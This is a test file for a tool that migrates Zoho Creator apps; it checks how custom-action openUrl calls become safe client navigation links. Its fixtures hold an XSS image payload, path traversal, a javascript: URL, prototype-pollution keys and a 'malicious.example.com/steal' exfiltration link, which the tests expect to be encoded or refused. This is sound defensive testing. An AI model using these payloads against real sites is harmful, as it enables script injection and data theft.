/**
 * A custom action whose workflow is only `openUrl` to this app's own form,
 * report or page is a client navigation: the button links to the target's
 * route (its access gate runs as for any visit) and a form link's query
 * prefills the target form from the clicked row. An external address, a
 * computed target, a report filter query, an unknown field or any other
 * statement keeps the action turned off and counted.
 */
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { JSDOM } from 'jsdom';
import { deriveIr, parse } from '../../core/src/index.js';
import { generate } from '../../deluge/src/index.js';
import { coverageLedger } from '../../quality/src/index.js';
import { buildUi } from '../src/index.js';
import type { UiAction, UiModel } from '../src/index.js';

const tab = (n: number) => '\t'.repeat(n);

const action = (label: string, workflow: string, header = false) =>
  `${tab(3)}custom action "${label}"\n${tab(3)}(\n${tab(4)}workflow = ${workflow}\n${header ? `${tab(4)}show action in view header = true\n` : ''}${tab(3)})`;

const clickFn = (name: string, body: string, exec = 'for each record') =>
  `${tab(2)}${name} as "${name}"\n${tab(2)}{\n${tab(3)}type = functions\n${tab(3)}form = Item\n${tab(3)}execution type = ${exec}\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${body
    .split('\n')
    .map((line) => `${tab(5)}${line}`)
    .join('\n')}\n${tab(4)})\n${tab(4)}}\n${tab(3)}}\n${tab(2)}}`;

const textField = (name: string) => `${tab(2)}${name}\n${tab(2)}(\n${tab(3)}type = text\n${tab(2)})`;

const NAV = {
  'Request It': ['Request_It', `openUrl("#Form:Request?Item_Ref=" + input.ID + "&zc_LoadIn=dialog","popup window","height=<height>,width=<width>");`, 'collection of records'],
  'Note It': ['Note_It', `openUrl("#Form:Request?Note=" + input.Name + "&Kind=Loan","same window");`],
  'New Request': ['New_Request', `openUrl("#Form:Request","popup window");`],
  'See Requests': ['See_Requests', `//Show the requests\nopenUrl("https://app.zohocreator.com" + zoho.appuri + "#Report:All_Requests","new window");`],
  'Go Home': ['Go_Home', `openUrl(zoho.appuri + "#Page:Home","same window");`],
  'Open Secret': ['Open_Secret', `openUrl("#Form:Secret?Item_Ref=" + input.ID,"popup window");`],
  'By Holder': ['By_Holder', `openUrl("#Form:Request?Item_Ref=" + input.Holder.ID,"popup window");`],
  'Holder Note': ['Holder_Note', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Note,"popup window");`],
  'Page Detail': ['Page_Detail', `openUrl("#Page:Detail?param1=" + input.Name + "&param2=Fixed","same window");`],
  'Bill Page': ['Bill_Page', `openUrl("#Page:Detail?param1=" + input.ID,"same window");`],
  'Literal Attack': ['Literal_Attack', `openUrl("#Page:Detail?param1=<img src=x onerror=alert(1)>","same window");`],
  'Filtered Report': ['Filtered_Report', `openUrl("#Report:All_Requests?Note=" + input.Name,"same window");`],
} as const;

const COUNTED = {
  External: ['External_Link', `openUrl("https://example.com/items?id=" + input.ID,"new window");`],
  'Two Links': ['Two_Links', `openUrl("#Form:Request","popup window");\nopenUrl("#Report:All_Requests","same window");`],
  Computed: ['Computed_Link', `openUrl(input.Name,"same window");`],
  'Report Op Filter': ['Report_Op_Filter', `openUrl("#Report:All_Requests?Note=" + input.Name + "&Note_op=26","same window");`],
  'Report Unknown Field': ['Report_Unknown_Field', `openUrl("#Report:All_Requests?Nope=" + input.Name,"same window");`],
  'Report Two Filters': ['Report_Two_Filters', `openUrl("#Report:All_Requests?Note=" + input.Name + "&Kind=Loan","same window");`],
  'Unknown Field': ['Unknown_Field', `openUrl("#Form:Request?Nope=" + input.ID,"popup window");`],
  'Unknown Read': ['Unknown_Read', `openUrl("#Form:Request?Note=" + input.Missing,"popup window");`],
  'Unknown Form': ['Unknown_Form', `openUrl("#Form:Nowhere","popup window");`],
  'Deep Read': ['Deep_Read', `openUrl("#Form:Request?Item_Ref=" + input.Name.ID,"popup window");`],
  'Deep Lookup': ['Deep_Lookup', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Note.Extra,"popup window");`],
  'Missing Leaf': ['Missing_Leaf', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Nope,"popup window");`],
  'Head Not Lookup': ['Head_Not_Lookup', `openUrl("#Form:Request?Item_Ref=" + input.Name.Note,"popup window");`],
  'Foreign Host': ['Foreign_Host', `openUrl("https://elsewhere.example" + zoho.appuri + "#Form:Request","popup window");`],
  'Undeclared Param': ['Undeclared_Param', `openUrl("#Page:Detail?nope=" + input.Name,"same window");`],
  'Undeclared Nested': ['Undeclared_Nested', `openUrl("#Page:Detail?nope=" + input.Holder.Note,"same window");`],
  'Case Mismatch': ['Case_Mismatch', `openUrl("#Page:Detail?PARAM1=" + input.Name,"same window");`],
  'Missing Page Params': ['Missing_Page_Params', `openUrl("#Page:Nowhere?param1=" + input.Name,"same window");`],
} as const;

// A body with any other statement is no navigation; this one generates a
// function, so it dispatches through the registry as before.
const MIXED = { Mixed: ['Mixed_Body', `info "Opening";\nopenUrl("#Form:Request","popup window");`] } as const;

const ALL = { ...NAV, ...COUNTED, ...MIXED } as Record<string, readonly string[]>;

function source(): string {
  const page = JSON.stringify("<zml><layout><row><column width='100%'><text value='Welcome'></text></column></row></layout></zml>");
  return `application "Lending"
{
${tab(1)}form Item
${tab(1)}{
${textField('Name')}
${textField('Status')}
${tab(2)}Holder
${tab(2)}(
${tab(3)}type = picklist
${tab(3)}values = Request.ID
${tab(3)}displayformat = [Note]
${tab(2)})
${tab(1)}}
${tab(1)}form Request
${tab(1)}{
${textField('Item_Ref')}
${textField('Note')}
${textField('Kind')}
${tab(1)}}
${tab(1)}form Secret
${tab(1)}{
${textField('Item_Ref')}
${tab(1)}}
${tab(1)}list All_Items
${tab(1)}{
${tab(2)}show all rows from Item
${tab(2)}(
${tab(3)}Name
${tab(3)}Status
${Object.entries(ALL)
  .map(([label, [workflow]]) => action(label, workflow!, label === 'See Requests' || label === 'Request It'))
  .join('\n')}
${tab(2)})
${tab(1)}}
${tab(1)}list All_Requests
${tab(1)}{
${tab(2)}show all rows from Request
${tab(2)}(
${tab(3)}Note
${tab(2)})
${tab(1)}}
${tab(1)}page Home
${tab(1)}{
${tab(2)}Content=${page}
${tab(1)}}
${tab(1)}page Detail(param1, param2)
${tab(1)}{
${tab(2)}Content=${page}
${tab(1)}}
${tab(1)}workflow
${tab(1)}{
${tab(1)}functions
${tab(1)}{
${Object.values(ALL)
  .map(([workflow, body, exec]) => clickFn(workflow!, body!, exec))
  .join('\n')}
${tab(1)}}
${tab(1)}}
}
`;
}

function built() {
  return buildUi(deriveIr(parse(source())));
}

function report(model: UiModel) {
  return model.reports.find((item) => item.name === 'All_Items')!;
}

interface Runtime {
  renderReport(report: unknown): string;
  renderReportRows(report: unknown, rows: unknown[]): string;
  cardActions(report: unknown, id: string, row?: unknown): { href?: string; action?: string; label: string }[];
  parseRoute(hash: string): Record<string, unknown>;
  boot(model: UiModel, doc: unknown): Promise<void>;
}

async function runtime(): Promise<Runtime> {
  (globalThis as { CSS?: unknown }).CSS ??= { escape: (value: string) => value };
  const { clientRuntimeSource } = await import('../src/generate.js');
  return (await import(`data:text/javascript;base64,${Buffer.from(clientRuntimeSource()).toString('base64')}`)) as unknown as Runtime;
}

const flush = async (n = 30) => {
  for (let i = 0; i < n; i++) await new Promise((resolve) => setTimeout(resolve, 0));
};

test('an openUrl-only workflow to an own form, report or page is a navigation; anything else stays a counted todo', () => {
  const { model, files } = built();
  const byName = new Map(report(model).customActions.map((item) => [item.name, item]));
  assert.deepEqual(byName.get('Request It')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'ROWID' }] });
  assert.deepEqual(byName.get('Note It')?.navigate, {
    kind: 'form',
    target: 'Request',
    href: '#/form/Request',
    params: [
      { name: 'Note', field: 'Name' },
      { name: 'Kind', value: 'Loan' },
    ],
  });
  assert.deepEqual(byName.get('New Request')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [] });
  assert.deepEqual(byName.get('See Requests')?.navigate, { kind: 'report', target: 'All_Requests', href: '#/report/All_Requests', params: [] });
  assert.deepEqual(byName.get('By Holder')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'Holder' }] });
  assert.deepEqual(byName.get('Holder Note')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'Holder.Note' }] });
  assert.deepEqual(byName.get('Go Home')?.navigate, { kind: 'page', target: 'Home', href: '#/page/Home', params: [] });
  assert.deepEqual(byName.get('Page Detail')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [
      { name: 'param1', field: 'Name' },
      { name: 'param2', value: 'Fixed' },
    ],
  });
  assert.deepEqual(byName.get('Bill Page')?.navigate, { kind: 'page', target: 'Detail', href: '#/page/Detail', params: [{ name: 'param1', field: 'ROWID' }] });
  assert.deepEqual(byName.get('Literal Attack')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [{ name: 'param1', value: '<img src=x onerror=alert(1)>' }],
  });
  assert.deepEqual(byName.get('Filtered Report')?.navigate, {
    kind: 'report',
    target: 'All_Requests',
    href: '#/report/All_Requests',
    params: [{ name: 'Note', field: 'Name' }],
  });
  for (const name of Object.keys(NAV)) assert.equal(byName.get(name)?.preview, undefined, `${name} is enabled`);
  for (const name of Object.keys(COUNTED)) {
    assert.equal(byName.get(name)?.preview, true, `${name} stays turned off`);
    assert.equal(byName.get(name)?.navigate, undefined, `${name} is no navigation`);
  }
  assert.equal(byName.get('Mixed')?.navigate, undefined, 'a mixed body is no navigation');
  assert.equal(byName.get('Mixed')?.preview, undefined, 'a mixed body that generated a function still dispatches');
  assert.ok(files.some((file) => file.path === 'functions/custom/mixed-body.mjs'));
  const externalLink = ' It opens an external URL, which Catalyst does not migrate as an action navigation; add a reviewed allowlisted link manually.';
  const actionTodos = model.todos.filter((todo) => todo.area === 'report' && /^Custom action /.test(todo.reason)).map((todo) => todo.reason);
  // Mixed still dispatches (its function runs), but the openUrl inside it is
  // dropped — a Catalyst nav-only button acting successfully while silently
  // going nowhere — so it is named too, ahead of the turned-off actions (its
  // todo is pushed while building actions, the turned-off ones afterwards).
  assert.deepEqual(actionTodos, [
    'Custom action "Mixed" on report "All_Items" runs its workflow, but a navigation (openUrl) inside it is not carried over — the button reports success without taking the user anywhere.',
    ...Object.keys(COUNTED).map((name) => `Custom action "${name}" is not migrated; its button is turned off.${name === 'External' || name === 'Foreign Host' ? externalLink : ''}`),
  ]);
  assert.ok(
    model.todos
      .filter((todo) => todo.area === 'report' && /^Custom action /.test(todo.reason))
      .every((todo) => todo.manualStep?.trim()),
    'every custom-action TODO names the location-specific manual step',
  );
  assert.ok(
    model.todos
      .filter((todo) => todo.area === 'report' && /^Custom action /.test(todo.reason) && !todo.reason.startsWith('Custom action "Mixed"'))
      .every((todo) => todo.manualReasons?.includes('untranslated')),
  );
  const migration = files.find((file) => file.path.endsWith('migration-report.json'));
  assert.equal((JSON.parse(String(migration?.data)) as { uiTodoCount: number }).uiTodoCount, model.todos.length);
});

test('a navigation needs the workflow on the report form with a record execution type', () => {
  const text = source().replace(`${tab(3)}form = Item\n${tab(3)}execution type = for each record\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${tab(5)}openUrl("#Form:Request?Note="`, `${tab(3)}form = Request\n${tab(3)}execution type = for each record\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${tab(5)}openUrl("#Form:Request?Note="`);
  assert.notEqual(text, source(), 'the fixture moved Note_It to another form');
  const { model } = buildUi(deriveIr(parse(text)));
  const noteIt = report(model).customActions.find((item) => item.name === 'Note It');
  assert.equal(noteIt?.navigate, undefined);
  assert.equal(noteIt?.preview, true);
});

test('the static client links each navigation with values only from the row it read', async () => {
  const rt = await runtime();
  const ui = report(built().model);
  const rows = rt.renderReportRows(ui, [{ ROWID: '7', Name: 'Desk & chair', Status: 'In', Holder: '42' }, { ROWID: '8', Status: 'Out' }]);
  const dom = new JSDOM(`<table><tbody>${rows}</tbody></table>`);
  const [first, second] = [...(dom.window.document as unknown as Document).querySelectorAll('tr[data-card]')];
  const links = (tr: Element) => [...tr.querySelectorAll('td[data-row-ops] a[data-action-nav]')].map((a) => `${a.textContent} ${a.getAttribute('href')}`);
  assert.deepEqual(links(first!), [
    'Request It #/form/Request?Item_Ref=7',
    'Note It #/form/Request?Note=Desk%20%26%20chair&Kind=Loan',
    'New Request #/form/Request',
    'Go Home #/page/Home',
    'Open Secret #/form/Secret?Item_Ref=7',
    'By Holder #/form/Request?Item_Ref=42',
    'Page Detail #/page/Detail?param1=Desk%20%26%20chair&param2=Fixed',
    'Bill Page #/page/Detail?param1=7',
    'Literal Attack #/page/Detail?param1=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
    'Filtered Report #/report/All_Requests?Note=Desk%20%26%20chair',
  ]);
  // Row 8's row-backed values are absent: those actions are disabled rather
  // than opened with partial or bare routes.
  assert.deepEqual(links(second!), [
    'Request It #/form/Request?Item_Ref=8',
    'New Request #/form/Request',
    'Go Home #/page/Home',
    'Open Secret #/form/Secret?Item_Ref=8',
    'Bill Page #/page/Detail?param1=8',
    'Literal Attack #/page/Detail?param1=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
  ]);
  // Counted actions draw no link.
  assert.doesNotMatch(rows, /External|Mixed|Computed|Report Op Filter|Report Unknown Field|Report Two Filters|Undeclared Param|Undeclared Nested|Case Mismatch|Missing Page|Deep Lookup|Missing Leaf|Head Not Lookup/);
  // The phone card carries the same links.
  const card = rt.cardActions(ui, '7', { ROWID: '7', Name: 'Desk' }).filter((item) => item.href && !item.href.startsWith('#/report/All_Items'));
  assert.equal(card.find((item) => item.label === 'Note It')?.href, '#/form/Request?Note=Desk&Kind=Loan');
  // A header navigation that needs no row sits in the toolbar as a link; one
  // that prefills from a row does not.
  const shell = new JSDOM(rt.renderReport(ui)).window.document as unknown as Document;
  const toolbar = [...shell.querySelectorAll('[data-report-tools] a[data-action-nav]')].map((a) => `${a.textContent} ${a.getAttribute('href')}`);
  assert.deepEqual(toolbar, ['See Requests #/report/All_Requests']);
  assert.equal(shell.querySelector('[data-report-tools] [data-action]')?.textContent, undefined, 'no row-bound action in the toolbar');
});

test('a one-level lookup read prefills from the row dotted key, and refuses navigation when the caller could not read it', async () => {
  const rt = (await runtime()) as Runtime & { actionNavHref(nav: unknown, row: unknown): string | undefined };
  const { model } = built();
  const nav = report(model).customActions.find((item) => item.name === 'Holder Note')?.navigate!;
  assert.ok(nav, 'a one-level lookup read migrates');
  assert.deepEqual(nav.params, [{ name: 'Item_Ref', field: 'Holder.Note' }]);
  const href = (row: unknown) => rt.actionNavHref(nav, row);
  // The dotted key the server attached under the caller scope prefills.
  assert.equal(href({ ROWID: '7', 'Holder.Note': 'First note' }), '#/form/Request?Item_Ref=First%20note');
  // A nested object cell (a supplied row) resolves the same path.
  assert.equal(href({ ROWID: '7', Holder: { Note: 'Nested' } }), '#/form/Request?Item_Ref=Nested');
  // No scalar on the row (the caller cannot read the lookup or its field):
  // the action is disabled, never degraded to the target's bare route.
  assert.equal(href({ ROWID: '7', Holder: '42' }), undefined);
  assert.equal(href({ ROWID: '7', Holder: null }), undefined);
  assert.equal(href({ ROWID: '7' }), undefined);
  // A non-scalar cell never travels.
  assert.equal(href({ ROWID: '7', 'Holder.Note': { text: 'x' } }), undefined);
  assert.equal(href({ ROWID: '7', 'Holder.Note': ['a'] }), undefined);
  // A hostile related value stays a literal data value: encoded in the query,
  // never in the path, and decoding returns the exact input.
  const hostile = href({ ROWID: '7', 'Holder.Note': '<img src=x onerror=alert(1)>../' })!;
  assert.ok(hostile.startsWith('#/form/Request?'), hostile);
  assert.doesNotMatch(hostile, /[<>"]/);
  assert.ok(!hostile.includes('../'), 'no path traversal in the link');
  const query = Object.fromEntries(new URLSearchParams(hostile.split('?')[1]).entries());
  assert.equal(query.Item_Ref, '<img src=x onerror=alert(1)>../');
});

test('a prefilled form route fills only the target form fields, and an edit route presets the record', async () => {
  const rt = await runtime();
  assert.deepEqual(rt.parseRoute('#/form/Request?Item_Ref=7&Note=a%20b'), { name: 'form', id: 'Request', edit: undefined, prefill: { Item_Ref: '7', Note: 'a b' } });
  assert.deepEqual(rt.parseRoute('#/form/Request'), { name: 'form', id: 'Request', edit: undefined });
  assert.deepEqual(rt.parseRoute('#/form/Request/edit/5?Note=x'), { name: 'form', id: 'Request', edit: '5', prefill: { Note: 'x' } });
  const { model } = built();
  const dom = new JSDOM('<!doctype html><body><main id="main"></main></body>', { url: 'http://localhost/app/index.html#/form/Request?Item_Ref=7&Note=Desk&Bogus=1' });
  (dom.window as unknown as { fetch: unknown }).fetch = async () => ({ ok: true, status: 200, json: async () => ({ dryRun: true }), text: async () => '{}' });
  await rt.boot(model, dom.window.document);
  await flush();
  const value = (name: string) => (dom.window.document.querySelector(`[name="${name}"]`) as HTMLInputElement | null)?.value;
  assert.equal(value('Item_Ref'), '7');
  assert.equal(value('Note'), 'Desk');
  assert.equal(value('Kind'), '');
  assert.equal(dom.window.document.querySelector('[name="Bogus"]'), null);
});

test('a page navigation carries only declared params, applied as encoded data values', async () => {
  const rt = (await runtime()) as Runtime & {
    actionNavHref(nav: unknown, row: unknown): string;
    snippetPageInput(doc: unknown): Record<string, string>;
    hydrateSnippets(root: unknown, model: unknown, view: unknown): void;
  };
  const { model } = built();
  const nav = report(model).customActions.find((item) => item.name === 'Page Detail')?.navigate!;
  assert.ok(nav, 'a page action with declared params migrates');
  // A hostile row value stays a literal data value: encoded in the query,
  // never in the path, and decoding returns the exact input.
  const href = rt.actionNavHref(nav, { ROWID: '7', Name: '<img src=x onerror=alert(1)>../' });
  assert.ok(href.startsWith('#/page/Detail?'), href);
  assert.doesNotMatch(href, /[<>"]/);
  assert.ok(!href.includes('../'), 'no path traversal in the link');
  const query = Object.fromEntries(new URLSearchParams(href.split('?')[1]).entries());
  assert.equal(query.param1, '<img src=x onerror=alert(1)>../');
  assert.equal(query.param2, 'Fixed');
  // The page route reads the query back as data values only.
  // snippetPageInput returns a null-prototype object by design; spreading
  // copies its exact entries into a plain object so deepEqual checks the same
  // keys and values without tripping on the prototype.
  assert.deepEqual({ ...rt.snippetPageInput({ location: { hash: '#/page/Detail?param1=a%20b&param2=%3Cimg%3E' } }) }, {
    param1: 'a b',
    param2: '<img>',
  });
  // Prototype-shaping names never become input keys.
  assert.deepEqual({ ...rt.snippetPageInput({ location: { hash: '#/page/Detail?__proto__=x&constructor=y&param1=z' } }) }, { param1: 'z' });
});

test('the page receives declared params as its snippet render input', async () => {
  const rt = (await runtime()) as Runtime & {
    snippetPageInput(doc: unknown): Record<string, string>;
    hydrateSnippets(root: unknown, model: unknown, view: unknown): void;
  };
  const { model } = built();
  const posted: { url: string; input: unknown }[] = [];
  const dom = new JSDOM('<div><div data-snippet-src="/htmlpages/Detail/s0">shell</div></div>', {
    url: 'http://localhost/app/index.html#/page/Detail?param1=Desk&param2=<b>',
  });
  const root = dom.window.document.querySelector('div')!;
  rt.hydrateSnippets(root, model, {
    fetch: async (url: string, init: { body: string }) => {
      posted.push({ url, input: (JSON.parse(init.body) as { input: unknown }).input });
      return { ok: true, status: 200, json: async () => ({ html: '<p>ok</p>' }), text: async () => '{}' };
    },
    location: (dom.window as unknown as { location: unknown }).location,
  });
  await flush();
  assert.equal(posted.length, 1);
  assert.equal(posted[0]!.url, '/htmlpages/Detail/s0');
  assert.deepEqual(posted[0]!.input, { param1: 'Desk', param2: '<b>' });
});

test('a navigation to a screen the caller cannot open is refused by that screen gate', async () => {
  const rt = await runtime();
  const { model } = built();
  const href = report(model).customActions.find((item) => item.name === 'Open Secret')?.navigate?.href;
  assert.equal(href, '#/form/Secret');
  // Secret is listed only in a hidden section: its route asks the server first.
  model.nav = [...model.nav.map((section) => ({ ...section, items: section.items.filter((item) => item.name !== 'Secret') })), { name: 'Back office', hidden: true, items: [{ kind: 'form', name: 'Secret', label: 'Secret', href: '#/form/Secret' }] }] as UiModel['nav'];
  const calls: string[] = [];
  const dom = new JSDOM('<!doctype html><body><main id="main"></main></body>', { url: `http://localhost/app/index.html${href}?Item_Ref=7` });
  (dom.window as unknown as { fetch: unknown }).fetch = async (url: string) => {
    calls.push(url);
    return { ok: false, status: 403, json: async () => ({}), text: async () => '{}' };
  };
  await rt.boot(model, dom.window.document);
  await flush();
  const main = dom.window.document.querySelector('main') as unknown as HTMLElement;
  assert.equal(main.querySelector('[data-access-status]')?.getAttribute('data-access-status'), '403', main.innerHTML);
  assert.equal(main.querySelector('form'), null, 'the gated form is not drawn');
  assert.ok(calls.length > 0, 'the gate asked the server');
});

test('a custom action workflow delegating to an openUrl function navigates to the target form with mapped parameters', async () => {
  const ds = `application "DelegatedNav"
{
  form Task
  {
    Task_Title ( type = text )
  }
  form Add_Attachment
  {
    Task_Name ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "Add Comment"
      (
        workflow = Add_Comments1
        show action in view header = true
      )
    )
  }
  functions
  {
    void customActions.addComment(int taskRecID)
    {
      openUrl("#Form:Add_Attachment?Task_Name=" + taskRecID, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Add_Comments1 as "Add Comments"
      {
        type = functions
        form = Task
        execution type = for each record
        on start
        {
          actions
          {
            thisapp.customActions.addComment(ID);
          }
        }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const { model } = buildUi(app);
  const gen = generate(app);
  assert.ok(gen.files.some((f) => f.path === 'functions/custom/customactions-addcomment.mjs'), 'customActions.addComment module emitted');
  assert.ok(gen.files.some((f) => f.path === 'functions/custom/add-comments1.mjs'), 'Add_Comments1 module emitted');

  const rows = coverageLedger(app);
  const fnRow = rows.find((r) => r.kind === 'function' && r.name === 'customActions.addComment');
  assert.equal(fnRow?.status, 'emitted', 'customActions.addComment is not dropped');

  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  const act = rep?.customActions.find((a) => a.name === 'Add Comment');
  assert.equal(act?.preview, undefined, 'Add Comment is enabled');
  assert.deepEqual(act?.navigate, {
    kind: 'form',
    target: 'Add_Attachment',
    href: '#/form/Add_Attachment',
    params: [{ name: 'Task_Name', field: 'ROWID' }],
  });

  // Verify DOM rendering
  const rt = await runtime();
  const rendered = rt.renderReportRows(rep, [{ ROWID: '42', Task_Title: 'Fix bug' }]);
  assert.ok(rendered.includes('#/form/Add_Attachment?Task_Name=42'), 'action link has prefilled ROWID');
  assert.ok(rendered.includes('data-action-nav=""'), 'action link has data-action-nav');
});

test('unsupported openUrl targets in custom functions become counted todos, not silent drops or launderings', () => {
  const ds = `application "UnsupportedTargets"
{
  form Task
  {
    Task_Title ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "External" ( workflow = Open_External )
      custom action "Bad Script" ( workflow = Open_Script )
      custom action "Missing Form" ( workflow = Open_Missing )
    )
  }
  functions
  {
    void customActions.externalLink(int id)
    {
      openUrl("https://malicious.example.com/steal?id=" + id, "popup window");
    }
    void customActions.scriptLink(int id)
    {
      openUrl("javascript:alert(1)", "popup window");
    }
    void customActions.missingForm(int id)
    {
      openUrl("#Form:NoSuchForm?id=" + id, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Open_External as "Open External"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.externalLink(ID); } }
      }
      Open_Script as "Open Script"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.scriptLink(ID); } }
      }
      Open_Missing as "Open Missing"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.missingForm(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 3, 'all 3 unsupported openUrl functions generate counted todos');

  const rows = coverageLedger(app);
  for (const fnName of ['customActions.externalLink', 'customActions.scriptLink', 'customActions.missingForm']) {
    const row = rows.find((r) => r.kind === 'function' && r.name === fnName);
    assert.equal(row?.status, 'counted', `${fnName} is counted, never silently dropped`);
    assert.equal(row?.via, 'todo');
  }

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  for (const name of ['External', 'Bad Script', 'Missing Form']) {
    const act = rep?.customActions.find((a) => a.name === name);
    assert.equal(act?.preview, true, `${name} button is turned off`);
    assert.equal(act?.navigate, undefined, `${name} has no client navigation`);
  }
  const actionTodo = model.todos.find((todo) => todo.area === 'report' && todo.name === 'All_Tasks' && /^Custom action "External"/.test(todo.reason));
  assert.match(actionTodo?.reason ?? '', /external URL/);
});

test('mutation test: breaking parameter delegation or target validation breaks client navigation', () => {
  const ds = `application "MutationApp"
{
  form Item
  {
    Title ( type = text )
  }
  form Target
  {
    Ref_ID ( type = text )
  }
  list Items
  {
    show all rows from Item
    (
      Title
      custom action "Go" ( workflow = Nav_Action )
    )
  }
  functions
  {
    void customActions.target(int itemId)
    {
      openUrl("#Form:Target?Ref_ID=" + itemId, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Nav_Action as "Nav Action"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.target(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const { model } = buildUi(app);
  const act = model.reports[0]!.customActions[0]!;
  assert.equal(act.preview, undefined);
  assert.deepEqual(act.navigate, {
    kind: 'form',
    target: 'Target',
    href: '#/form/Target',
    params: [{ name: 'Ref_ID', field: 'ROWID' }],
  });

  // Mutate: if target form field does not match ('Ref_ID' vs 'Wrong_Field'), navigation is refused
  const mutatedDs = ds.replace('Ref_ID=', 'Wrong_Field=');
  const mutatedApp = deriveIr(parse(mutatedDs));
  const mutatedUi = buildUi(mutatedApp);
  const mutatedAction = mutatedUi.model.reports[0]!.customActions[0]!;
  assert.equal(mutatedAction.preview, true, 'mutated unknown field turns action off');
  assert.equal(mutatedAction.navigate, undefined, 'mutated unknown field produces no navigation');
});

test('a legacy #View: openUrl target resolves to the matching report or page, not a counted todo', () => {
  // Before Creator renamed "Views" to "Reports", and still today for custom
  // pages, openUrl used "#View:<name>" for both. A real exported app's
  // openUrl calls use this form routinely; the target is a report when a
  // report of that name exists, otherwise a page, exactly like the modern
  // #Report:/#Page: links already handled below.
  const ds = `application "LegacyView"
{
  form Task
  {
    Task_Title ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "Open Report" ( workflow = Open_Report )
      custom action "Open Page" ( workflow = Open_Page )
      custom action "Open Missing" ( workflow = Open_Missing )
    )
  }
  page Detail
  {
    Content="<zml><layout><row><column width='100%'><text value='Hi'></text></column></row></layout></zml>"
  }
  functions
  {
    void customActions.viewReport(int id)
    {
      openUrl("#View:All_Tasks","same window");
    }
    void customActions.viewPage(int id)
    {
      openUrl("#View:Detail","same window");
    }
    void customActions.viewMissing(int id)
    {
      openUrl("#View:Nowhere","same window");
    }
  }
  workflow
  {
    functions
    {
      Open_Report as "Open Report"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.viewReport(ID); } }
      }
      Open_Page as "Open Page"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.viewPage(ID); } }
      }
      Open_Missing as "Open Missing"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.viewMissing(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 1, 'only the #View: target with no matching report or page is counted');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Open Report')?.navigate, {
    kind: 'report',
    target: 'All_Tasks',
    href: '#/report/All_Tasks',
    params: [],
  });
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Open Page')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [],
  });
  const missing = rep?.customActions.find((a) => a.name === 'Open Missing');
  assert.equal(missing?.preview, true, 'the unresolved #View: target stays turned off');
  assert.equal(missing?.navigate, undefined);
});

test('a print/<Page> openUrl target or a page with typed header parameters is client navigation, not a counted todo', () => {
  // Creator custom actions use `openUrl(zoho.appuri + "print/<Page>?<param>=" + id, ...)`
  // to open a custom page for printing, and declare typed page parameters in `.ds`
  // such as `page Event_Summary(string event)`. Both resolve to the target page's
  // client navigation route when the page exists and declares the query parameters;
  // missing pages and undeclared parameters stay counted and turned off.
  const page = JSON.stringify("<zml><layout><row><column width='100%'><text value='Hi'></text></column></row></layout></zml>");
  const ds = `application "PrintAndTypedPageApp"
{
  form Order_Form
  {
    Title ( type = text )
  }
  list All_Orders
  {
    show all rows from Order_Form
    (
      Title
      custom action "Print Bill" ( workflow = Print_Bill )
      custom action "Event Summary" ( workflow = Open_Summary )
      custom action "Print Missing Page" ( workflow = Print_Missing )
      custom action "Print Undeclared Param" ( workflow = Print_Undeclared )
    )
  }
  page Restaurant_Bill(Order_Id)
  {
    Content=${page}
  }
  page Event_Summery1(string event)
  {
    Content=${page}
  }
  functions
  {
    void order.print(int order_id)
    {
      openUrl(zoho.appuri + "print/Restaurant_Bill?Order_Id=" + order_id,"new window");
    }
    void Event_Custom_Actions.eventSummery(int eventID)
    {
      openUrl(zoho.appuri + "#Page:Event_Summery1?event=" + eventID,"popup window");
    }
    void order.printMissing(int order_id)
    {
